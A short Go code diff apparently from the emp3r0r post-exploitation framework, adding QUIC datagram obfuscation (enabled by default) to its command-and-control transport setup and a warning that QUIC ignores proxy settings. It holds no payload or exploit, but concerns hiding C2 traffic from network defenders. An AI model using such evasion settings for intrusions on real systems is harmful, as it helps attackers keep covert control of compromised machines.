@@ -6,6 +6,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -38,6 +39,12 @@ func InitConfig() (err error) {
 
 	// Control-frame padding is a sender-side knob; 0 disables it.
 	transport.SetC2Padding(RuntimeConfig.PaddingMin, RuntimeConfig.PaddingMax)
+
+	// QUIC datagram obfuscation: on by default, opt out for stock QUIC.
+	transport.SetQUICStandardKey(RuntimeConfig.QUICStandardKey)
+	if RuntimeConfig.C2ChannelMode == def.C2ChannelModeQUIC && RuntimeConfig.C2TransportProxy != "" {
+		logging.Warningf("QUIC C2 transport does not support proxies; ignoring C2TransportProxy=%s", RuntimeConfig.C2TransportProxy)
+	}
 
 	// C2 TLS SNI override and stable mesh mTLS identity.
 	transport.SetC2ServerName(RuntimeConfig.SNI)
